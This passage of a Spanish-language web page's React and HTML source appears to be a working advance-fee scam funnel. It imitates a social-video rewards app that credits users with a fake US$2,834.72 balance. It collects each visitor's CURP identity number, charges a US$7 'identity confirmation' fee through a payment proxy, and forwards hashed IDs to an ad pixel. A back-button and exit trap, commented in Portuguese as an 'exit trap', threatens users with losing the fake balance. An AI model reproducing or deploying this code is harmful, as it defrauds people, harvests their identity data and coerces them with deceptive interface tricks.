            <h2 style={{ color:'#fff', fontSize:22, fontWeight:900, margin:'0 0 8px' }}>
              {onCorrect ? 'Confirmar identidad' : 'Confirmar datos'}
            </h2>
            <p style={{ color:'rgba(255,255,255,0.88)', fontSize:14, margin:0, lineHeight:1.65 }}>
              {onCorrect
                ? 'Verifica si los datos de abajo son tuyos antes de confirmar.'
                : 'Verifica si los datos de abajo son tuyos. Confirma para continuar.'}
            </p>
          </div>

          {/* Dados */}
          <div style={{ background:'rgba(0,0,0,0.28)', border:'1px solid rgba(255,255,255,0.2)', borderRadius:18, padding:'18px 20px', marginBottom:20 }}>
            <div style={{ color:'rgba(255,255,255,0.95)', fontSize:11, fontWeight:800, letterSpacing:1.5, textTransform:'uppercase', marginBottom:14 }}>Datos encontrados</div>
            {rows.length > 0 ? rows.map(([k, v], i) => (
              <div key={k} style={{ display:'flex', justifyContent:'space-between', alignItems:'flex-start', paddingBottom: i < rows.length-1 ? 11 : 0, marginBottom: i < rows.length-1 ? 11 : 0, borderBottom: i < rows.length-1 ? '1px solid rgba(255,255,255,0.1)' : 'none' }}>
                <span style={{ color:'rgba(255,255,255,0.75)', fontSize:13 }}>{k}</span>
                <span style={{ color:'#fff', fontSize:13, fontWeight:700, textAlign:'right', maxWidth:'60%', wordBreak:'break-word' }}>{v}</span>
              </div>
            )) : (
              <div style={{ textAlign:'center', padding:'14px 0' }}>
                <div style={{ fontSize:28, marginBottom:8 }}>⚠️</div>
                <div style={{ color:'rgba(255,255,255,0.92)', fontSize:13, lineHeight:1.6 }}>
                  No fue posible consultar los datos de esta CURP.<br/>
                  <span style={{ color:'rgba(255,255,255,0.75)', fontSize:12 }}>Puedes continuar de todos modos.</span>
                </div>
              </div>
            )}
          </div>

          {userFecha && (
            <div style={{ background:'rgba(0,0,0,0.28)', border:'1px solid rgba(52,211,153,0.4)', borderRadius:12, padding:'10px 16px', marginBottom:20 }}>
              <div style={{ color:'#34D399', fontSize:12, fontWeight:700 }}>? Identidad verificada</div>
              <div style={{ color:'rgba(255,255,255,0.92)', fontSize:12, marginTop:3 }}>Los datos anteriores se consultaron a partir de la CURP ingresada.</div>
            </div>
          )}

          <Btn onClick={handleConfirm} variant="gold" style={{ marginBottom: onCorrect ? 10 : 0 }}>

    // -- Tarifa SPEI --------------------------------------------------
    function TarifaSPEI({ CURP, userFecha, tipo, reset }) {
      useEffect(() => { track('etapa_6_pago_SPEI'); }, []);
      const [copied,      setCopied]      = useState(false);
      const [SPEICode,     setSPEICode]     = useState('');
      const [txId,        setTxId]        = useState('');
      const [seconds,     setSeconds]     = useState(20 * 60);
      const [loading,     setLoading]     = useState(true);
      const [erro,        setErro]        = useState('');
      const [checking,    setChecking]    = useState(false);
      const [statusMsg,   setStatusMsg]   = useState('');
      const [paid,        setPaid]        = useState(false);
      const SPEIPagoTracked = React.useRef(false);
      const [showDiscount, setShowDiscount]     = useState(false);
      const [discountAccepted, setDiscountAccepted] = useState(false);

      // Verifica se veio com desconto da tela anterior
      const isDiscount = !!window._SPEIDiscount;
      const AMOUNT     = (isDiscount || discountAccepted) ? 350 : 700;
      const VALOR_DISP = (isDiscount || discountAccepted) ? 'US$ 3.50' : 'US$ 7.00';
      const VALOR_NUM  = (isDiscount || discountAccepted) ? 3.50 : 7.00;

      // Registra back-redirect com desconto para esta tela
      useEffect(() => {
        window._handleBackRedirect = () => {
          if (!showDiscount && !discountAccepted) setShowDiscount(true);
        };
        return () => { window._handleBackRedirect = null; };
      }, [showDiscount, discountAccepted]);

      // Gerar SPEI real via Pagz
      useEffect(() => {
        const digits = (CURP || '').replace(/\D/g, '');
        const nome   = userFecha?.NOME || 'Usuario RewardApp';

        fetch('pagz-proxy.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            paymentMethod: 'PIX',
            amount: AMOUNT,
            customer: {
              name:     nome,
              document: digits || '00000000000',
              email:    `${digits || 'usuario'}@rewardapp.com`,
            },
            items: [{ title: 'Tarifa de confirmación de identidad', quantity: 1, unitPrice: AMOUNT }],
          }),
        })
          .then(r => r.json())
          .then(data => {
            if ((data?.SPEI?.qrcode || data?.pix?.qrcode)) {
              setSPEICode((data.SPEI || data.pix).qrcode);
              track('SPEI_gerado', { tipo: tipo || 'CURP' });
              if (data.id) setTxId(data.id);
              if ((data.SPEI || data.pix).expirationDate) {
                const diff = Math.floor((new Date((data.SPEI || data.pix).expirationDate) - Date.now()) / 1000);
                if (diff > 0) setSeconds(diff);
              }
              // TikTok: identify + InitiateCheckout ao exibir o SPEI
              const _digits = (CURP || '').replace(/\D/g, '');
              sha256(_digits).then(h => {
                if (window.ttq) {
                  window.ttq.identify({ external_id: h, phone_number: h });
                  window.ttq.track('InitiateCheckout', {
                    event_id:     genEventId('checkout'),
                    content_id:   'tarifa-confirmacao-identidad',
                    content_type: 'product',
                    content_name: 'Tarifa de confirmación de identidad',
                    currency:     'MXN',
                    value:        VALOR_NUM,
                  });
                }
              });
            } else {
              setErro('No fue posible generar el SPEI. Inténtalo de nuevo.');
            }
          })
          .catch(() => setErro('Error de conexión. Verifica tu internet.'))
          .finally(() => setLoading(false));
      }, []);

      // Verificar status do pago (usado pelo botão manual e pelo polling)
      const checkPaymentStatus = (id) => {
        return fetch(`pagz-proxy.php?id=${id}`)
          .then(r => r.json())
          .then(data => {
            const status = (data?.status || '').toLowerCase();
            if (status === 'paid' || status === 'approved' || status === 'completed') {
              setPaid(true);
              setStatusMsg('paid');
              if (!SPEIPagoTracked.current) {
                SPEIPagoTracked.current = true;
                track('SPEI_pago', { tipo: tipo || 'CURP' });
              }
              // TikTok: Purchase com dupla garantia (browser + server-side)
              const _digits = (CURP || '').replace(/\D/g, '');
              const _email  = userFecha?.EMAIL || `${_digits}@rewardapp.com`;
              window._SPEIDiscount = false; // limpa flag após compra
              trackPurchase({
                txId:      id,
                value:     VALOR_NUM,
                CURPDigits: _digits,
                email:     _email,
                nome:      userFecha?.NOME || '',
              }).finally(() => {
                window._exitOk = true;
                window.location.href = buildUrlWithUtm('upsell1/index.html');
              });
            } else if (status === 'expired' || status === 'cancelled') {
              setStatusMsg('expired');
            } else {
              setStatusMsg('pending');
            }
            return status;
          });
      };

      // Botão manual
      const handleCheckPayment = () => {
        if (!txId) { setStatusMsg('no_id'); return; }
        setChecking(true);
        setStatusMsg('');
        checkPaymentStatus(txId)
          .catch(() => setStatusMsg('error'))
          .finally(() => setChecking(false));
      };

      // Polling automático a cada 1.5 segundos quando o SPEI estiver ativo
      useEffect(() => {
        if (!txId || paid) return;
        const interval = setInterval(() => {
          checkPaymentStatus(txId).catch(() => {});
        }, 1500);
        return () => clearInterval(interval);
      }, [txId, paid]);

      // Contador regressivo
      useEffect(() => {
        if (!SPEICode) return;
        const t = setInterval(() => setSeconds(s => s > 0 ? s - 1 : 0), 1000);
        return () => clearInterval(t);
      }, [SPEICode]);

      const mm = String(Math.floor(seconds / 60)).padStart(2,'0');
      const ss = String(seconds % 60).padStart(2,'0');

      const handleCopy = () => {
        navigator.clipboard?.writeText(SPEICode).catch(() => {});
        setCopied(true);
        setTimeout(() => setCopied(false), 2500);
      };

      const qrUrl = SPEICode

        { ic:'💳', l:'Créditos app',    v:'US$2.834,72',    c:'#FE2C55', disabled:false },

      useEffect(() => {
        if (!confirming) return;
        const t = setTimeout(() => {
          if (confirming.l === 'Retirar dinero') {
            setSPEIFecha({ tipo:'Retiro', chave:'Retiro de dinero' });
            setCURPReceipt('');
            setFlow('pendencia');

        window._exitOk = true;

      if (flow === 'comprobante')        return <Comprobante SPEIFecha={SPEIFecha} CURP={CURPReceipt} userFecha={userFecha} reset={reset} onViewPendencia={() => setFlow('pendencia')} />;
      if (flow === 'CURP-verify')         return <CURPVerify SPEIFecha={SPEIFecha || {}} onBack={() => setFlow('success')} onConfirm={(CURP, ud) => { setCURPReceipt(CURP); setUserFecha(ud); setFlow('CURP-data-confirm'); }} />;
      if (flow === 'CURP-verify-credits') return <CURPVerify SPEIFecha={{}} onBack={() => setFlow('success')} onConfirm={(CURP, ud) => { setCURPReceipt(CURP); setUserFecha(ud); setFlow('CURP-data-confirm-credits'); }} />;
      if (flow === 'CURP-data-confirm')         return <CURPFechaConfirm CURP={CURPReceipt} userFecha={userFecha} onBack={() => setFlow('CURP-verify')} onConfirm={() => setFlow('comprobante')} animationType="SPEI-key" />;
      if (flow === 'CURP-data-confirm-credits') return <CURPFechaConfirm CURP={CURPReceipt} userFecha={userFecha} onBack={() => setFlow('CURP-verify-credits')} onConfirm={() => setFlow('credits-confirmed')} />;
      if (flow === 'SPEI-CURP-confirm')          return <CURPFechaConfirm CURP={CURPReceipt} userFecha={userFecha} onBack={() => setFlow('SPEI')} onConfirm={() => setFlow('comprobante')} confirmLabel="Confirmar identidad y ver comprobante →" onCorrect={() => setFlow('SPEI')} animationType="SPEI-key" />;
      if (flow === 'credits-confirmed')  return <CreditsConfirmed userFecha={userFecha} CURP={CURPReceipt} onViewPendencia={() => setFlow('pendencia-credits')} reset={reset} />;
      if (success && flow === 'success') return <Success type={success.type} SPEIFecha={SPEIFecha} userFecha={userFecha} onViewReceipt={() => setFlow(CURPReceipt ? 'SPEI-CURP-confirm' : 'CURP-verify')} onConfirmIdentity={() => setFlow('CURP-verify-credits')} onCorrect={() => setFlow('SPEI')} reset={reset} />;
      if (flow === 'SPEI')     return <SPEIForm onBack={() => setFlow(null)} onConfirm={(data, ud) => {
        setSPEIFecha(data); setUserFecha(ud);
        if (data.CURP) setCURPReceipt(data.CURP);
        setSuccess({ type:'SPEI' }); setFlow('success');
      }} />;
      if (flow === 'credits') return <CreditsInfo onBack={() => setFlow(null)} onConfirm={() => { setSuccess({ type:'credits' }); setFlow('success'); }} />;

      const handleResgatar = () => {
        if (sel === 'Retirar dinero') {
          setSPEIFecha({ tipo:'Retiro', chave:'Retiro de dinero' });
          setCURPReceipt('');
          setFlow('pendencia');
        }
        else if (sel === 'Créditos app') {
          setCURPReceipt('');
          setFlow('pendencia-credits');
        }
      };

      return (
        <div style={{ padding:'24px 20px 28px' }}>
          <style>{`
            @keyframes saldoIn     { 0%{opacity:0;transform:translateY(-16px) scale(0.96)} 60%{transform:translateY(3px) scale(1.01)} 100%{opacity:1;transform:translateY(0) scale(1)} }
            @keyframes borderSpin  { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
            @keyframes saldoNum    { 0%{opacity:0;transform:scale(0.8)} 70%{transform:scale(1.06)} 100%{opacity:1;transform:scale(1)} }
            @keyframes rewardPop   { 0%{opacity:0;transform:scale(0.4) rotate(-8deg)} 65%{transform:scale(1.18) rotate(3deg)} 100%{opacity:1;transform:scale(1) rotate(0deg)} }
            @keyframes confirmBar  { from{width:0%} to{width:100%} }
            @keyframes tapPulse    { 0%,100%{transform:translateY(0)} 50%{transform:translateY(4px)} }
          `}</style>

          {/* Wrapper com borda animada */}
          <div style={{ position:'relative', marginBottom:22, borderRadius:26, padding:2, animation:'saldoIn 0.6s cubic-bezier(0.34,1.2,0.64,1) both' }}>

            {/* Borda giratória com gradiente */}
            <div style={{ position:'absolute', inset:0, borderRadius:26, padding:2, zIndex:0, overflow:'hidden' }}>
              <div style={{
                position:'absolute',
                top:'50%', left:'50%',
                width:'200%', height:'200%',
                marginTop:'-100%', marginLeft:'-100%',
                background:'conic-gradient(from 0deg, transparent 0deg, #25F4EE 60deg, #FE2C55 120deg, transparent 180deg, transparent 270deg, #25F4EE 330deg, transparent 360deg)',
                animation:'borderSpin 3s linear infinite',
                borderRadius:'50%',
              }}/>
            </div>

            {/* Card interno */}
            <div style={{ position:'relative', zIndex:1, background:'#111111', backdropFilter:'blur(16px)', borderRadius:24, padding:'22px' }}>
              <div style={{ color:'rgba(255,255,255,0.70)', fontSize:11, letterSpacing:2, textTransform:'uppercase', marginBottom:4 }}>Saldo disponible</div>
              <div style={{ color:'#25F4EE', fontSize:42, fontWeight:900, lineHeight:1.15, animation:'saldoNum 0.7s 0.3s cubic-bezier(0.34,1.2,0.64,1) both' }}>
                US$ {usd}
              </div>
              <div style={{ color:'rgba(255,255,255,0.75)', fontSize:13, marginTop:6 }}>
                💎 {counter.toLocaleString('es-MX')} puntos acumulados
              </div>
              <div style={{ marginTop:14, paddingTop:14, borderTop:'1px solid rgba(255,255,255,0.08)', color:'rgba(255,255,255,0.55)', fontSize:11 }}>
                ⏳ Los puntos expiran en 30 días
              </div>
            </div>
          </div>

          {confirming ? (
            /* -- Tela de confirmação -- */
            <div style={{ textAlign:'center', padding:'18px 8px 8px', animation:'fadeSlideIn 0.3s ease both' }}>
              <div style={{ fontSize:72, marginBottom:14, animation:'rewardPop 0.55s cubic-bezier(0.34,1.4,0.64,1) both' }}>
                {confirming.ic}
              </div>
              <div style={{ color:'rgba(255,255,255,0.6)', fontSize:12, fontWeight:600, marginBottom:4 }}>
                Elegiste
              </div>
              <div style={{ color:'#fff', fontSize:22, fontWeight:900, marginBottom:4 }}>
                {confirming.l}
              </div>
              <div style={{ color:confirming.c, fontSize:17, fontWeight:800, marginBottom:22 }}>
                {confirming.v}
              </div>
              <div style={{ background:'rgba(255,255,255,0.10)', borderRadius:8, height:7, overflow:'hidden', marginBottom:14 }}>
                <div style={{
                  height:'100%', borderRadius:8,
                  background:`linear-gradient(90deg,${confirming.c},#25F4EE)`,
                  animation:`confirmBar 1.9s linear both`,
                }}/>
              </div>
              <div style={{ color:'rgba(255,255,255,0.55)', fontSize:12, fontWeight:600 }}>
                ⏳ Preparando tu canje...
              </div>
            </div>
          ) : (
            <>
              {/* Header instrucional */}
              <div style={{ marginBottom:14 }}>
                <h3 style={{ color:'#fff', fontWeight:800, fontSize:16, margin:'0 0 5px' }}>
                  🎁 Elige tu recompensa
                </h3>
                <div style={{ display:'flex', alignItems:'center', gap:5, color:'rgba(255,255,255,0.55)', fontSize:12, fontWeight:600 }}>
                  <span style={{ animation:'tapPulse 1s ease-in-out infinite' }}>👇</span>
                  Toca la tarjeta para canjear al instante
                </div>
              </div>

              {/* Grid de cards */}
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:10 }}>
                {opts.map(o => (
                  <button key={o.l} onClick={() => { if (o.disabled) return; setSel(o.l); setConfirming(o); track('recompensa_selecionada', { tipo: o.l }); }} style={{
                    background: o.disabled
                      ? 'rgba(0,0,0,0.40)'
                      : sel === o.l
                        ? `linear-gradient(145deg, ${o.c}28 0%, ${o.c}14 100%)`
                        : 'rgba(0,0,0,0.38)',
                    border: sel === o.l
                      ? `2.5px solid ${o.c}`
                      : o.disabled
                        ? '2px solid rgba(255,255,255,0.20)'
                        : `2px solid ${o.c}`,
                    borderRadius:16, padding:'14px 10px',
                    cursor: o.disabled ? 'not-allowed' : 'pointer',
                    textAlign:'center',
                    transition:'all 0.25s ease',
                    transform: !o.disabled && sel === o.l ? 'scale(1.06)' : 'scale(1)',
                    boxShadow: sel === o.l ? `0 0 18px 4px ${o.c}55, 0 6px 20px rgba(0,0,0,0.4)` : 'none',
                    animation: !o.disabled && !sel ? 'cardPulse 2s ease-in-out infinite' : 'none',
                    opacity: o.disabled ? 0.78 : 1,
                    position:'relative',
                  }}>
                    <div style={{ fontSize:28, marginBottom:5, filter: o.disabled ? 'grayscale(0.6)' : 'none' }}>{o.ic}</div>
                    <div style={{ color: o.disabled ? 'rgba(255,255,255,0.80)' : '#fff', fontSize:12, fontWeight:700, lineHeight:1.3, marginBottom:4 }}>{o.l}</div>
                    <div style={{ color: o.disabled ? 'rgba(255,255,255,0.60)' : o.c, fontSize: o.disabled ? 11 : 13, fontWeight:800 }}>
                      {o.disabled ? 'No disponible' : o.v}
                    </div>
                    {!o.disabled && <div style={{ position:'absolute', bottom:8, left:0, right:0, color:'rgba(255,255,255,0.35)', fontSize:10, fontWeight:700 }}>toca para canjear</div>}
                  </button>
                ))}
              </div>
            </>
          )}
        </div>
      );
    }

    // -- Config ----------------------------------------------------
    const GRADS = [
      'linear-gradient(160deg,#111111 0%,#1a0008 55%,#050005 100%)',
      'linear-gradient(160deg,#050005 0%,#0a0008 55%,#111111 100%)',
      'linear-gradient(160deg,#0d0d0d 0%,#1a0008 55%,#050005 100%)',
      'linear-gradient(160deg,#050005 0%,#111111 55%,#0d0d0d 100%)',
    ];

    const INIT_TASKS = [
      { id:1, icon:'👤', title:'Crea tu cuenta',        points:100, done:1, total:1 },
      { id:2, icon:'▶️', title:'Mira 1000 videos',       points:300, done:1000, total:1000 },
      { id:3, icon:'📝', title:'Completa tu perfil',    points:200, done:5, total:5 },
      { id:5, icon:'🤝', title:'Invita a un amigo',      points:300, done:1, total:1 },
      { id:4, icon:'🔔', title:'Activa notificaciones',  points:100, done:0, total:1 },
    ];

    // -- App -------------------------------------------------------
    function App() {
      const [sc, setSc]         = useState(0);
      const [dir, setDir]       = useState('fwd');
      const [tasks, setTasks]   = useState(INIT_TASKS);
      const [confetti, setConfetti] = useState(false);

      const pts     = tasks.filter(t => t.done >= t.total).reduce((s,t) => s + t.points, 0);
      const allDone = tasks.every(t => t.done >= t.total);

      const go   = (n) => { setDir(n > sc ? 'fwd' : 'bck'); setSc(n); };
      const prog = (id) => setTasks(p => p.map(t => t.id === id && t.done < t.total ? { ...t, done:t.done+1 } : t));

      useEffect(() => {
        if (sc === 2) {
          setConfetti(true);
          const t = setTimeout(() => setConfetti(false), 5000);
          return () => clearTimeout(t);
        }
      }, [sc]);

      const cc = useCounter(pts, 1800, sc === 2);
      const rc = useCounter(pts, 1000, sc === 3);
      const reset = () => { setTasks(INIT_TASKS); go(0); };

      return (
        <div id="app-outer" style={{
          minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center',
          background:'#050005',
          fontFamily:'-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif',
        }}>
          <Confetti on={confetti}/>

          <div id="app-card" style={{
            width:'100%', maxWidth:400, overflow:'hidden',
            position:'relative',
            boxShadow:'0 50px 110px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.07)',
            background: GRADS[sc],
            transition:'background 0.75s ease',
          }}>
            <div key={sc} style={{ animation:`${dir === 'fwd' ? 'slideInR' : 'slideInL'} 0.42s cubic-bezier(0.34,1.1,0.64,1) both` }}>
              {sc === 0 && <Welcome go={() => go(1)}/>}
              {sc === 1 && <Tasks   tasks={tasks} prog={prog} go={() => go(3)} allDone={allDone}/>}
              {sc === 2 && <Celebrate pts={pts} counter={cc} go={() => go(3)}/>}
              {sc === 3 && <Rewards  counter={rc} reset={reset}/>}
            </div>

            {/* Step dots */}
            <div style={{ position:'absolute', bottom:18, left:0, right:0, display:'flex', justifyContent:'center', gap:6, pointerEvents:'none' }}>
              {[0,1,2,3].map(i => (
                <div key={i} style={{
                  width: i === sc ? 22 : 6, height:6, borderRadius:3,
                  background: i === sc ? 'rgba(255,255,255,0.92)' : 'rgba(255,255,255,0.22)',
                  transition:'all 0.35s ease',
                }}/>
              ))}
            </div>
          </div>
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById('root'));
    root.render(<App/>);
  </script>

<script>
  (function() {
    // Armadilha de saída — mantém o usuário no funil
    history.pushState({ trapped: true }, '');
    var trapShown = false;
    window.addEventListener('popstate', function() {
      history.pushState({ trapped: true }, '');
      // Se uma tela React registrou um handler de desconto, deixa ela tratar
      if (typeof window._handleBackRedirect === 'function') {
        window._handleBackRedirect();
        return;
      }
      if (!trapShown) {
        trapShown = true;
        document.getElementById('trap-overlay-main').style.display = 'flex';
      }
    });
    window.addEventListener('beforeunload', function(e) {
      if (window._exitOk) return;
      e.preventDefault();
      e.returnValue = '';
    });
  })();
</script>

<div id="trap-overlay-main" style="display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.92);backdrop-filter:blur(14px);align-items:flex-end;justify-content:center;">
  <div style="background:linear-gradient(150deg,#050005 0%,#050005 60%,#000000 100%);border-radius:28px 28px 0 0;padding:32px 24px 48px;max-width:400px;width:100%;border:1px solid rgba(255,255,255,0.14);box-shadow:0 -20px 60px rgba(0,0,0,0.7);animation:trapSlideMain 0.35s ease both;">
    <style>@keyframes trapSlideMain{from{transform:translateY(100%);opacity:0}to{transform:translateY(0);opacity:1}}</style>
    <div style="text-align:center;margin-bottom:24px;">
      <div style="font-size:56px;margin-bottom:12px;">⚠️</div>
      <div style="display:inline-block;background:rgba(248,113,113,0.15);border:1px solid rgba(248,113,113,0.4);border-radius:20px;padding:4px 14px;color:#F87171;font-size:11px;font-weight:800;letter-spacing:0.5px;margin-bottom:12px;font-family:sans-serif;">⚠️ ATENCIÓN</div>
      <h2 style="color:#fff;font-size:21px;font-weight:900;margin:0 0 10px;font-family:sans-serif;letter-spacing:-0.3px;">¡Tu saldo será cancelado!</h2>
      <p style="color:rgba(255,255,255,0.75);font-size:13px;line-height:1.65;margin:0;font-family:sans-serif;">
        Si sales ahora, <strong style="color:#25F4EE">tu saldo acumulado será cancelado permanentemente</strong> y perderás todo lo que conseguiste.
      </p>
    </div>
    <div style="background:rgba(0,0,0,0.3);border-radius:16px;padding:16px;border:1px solid rgba(37,244,238,0.2);margin-bottom:20px;">
      <div style="display:flex;align-items:center;gap:12px;">
        <span style="font-size:26px;">🔒</span>
        <div style="color:rgba(255,255,255,0.88);font-size:13px;line-height:1.6;font-family:sans-serif;">
          <strong style="color:#25F4EE;font-size:18px;">US$ 2.834,72</strong><br/>
          en saldo esperando liberación.<br/>
          <span style="color:rgba(255,255,255,0.55);font-size:12px;">Completa el proceso ahora para recibir.</span>
        </div>
      </div>
    </div>
    <button
      onclick="document.getElementById('trap-overlay-main').style.display='none';trapShown=false;"
      style="width:100%;padding:16px;border:none;border-radius:22px;background:linear-gradient(135deg,#25F4EE,#FE2C55);color:#0a0a0a;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:10px;font-family:sans-serif;box-shadow:0 8px 24px rgba(254,44,85,0.45);">
      🔓 Continuar y liberar mi saldo
    </button>
    <button
      onclick="history.pushState({trapped:true},'');document.getElementById('trap-overlay-main').style.display='none';trapShown=false;"
      style="width:100%;padding:13px;background:transparent;border:1.5px solid rgba(255,255,255,0.15);border-radius:20px;color:rgba(255,255,255,0.35);font-size:12px;font-weight:600;cursor:pointer;font-family:sans-serif;">
      Quiero perder mi saldo
    </button>
  </div>
</div>
</body>
</html>
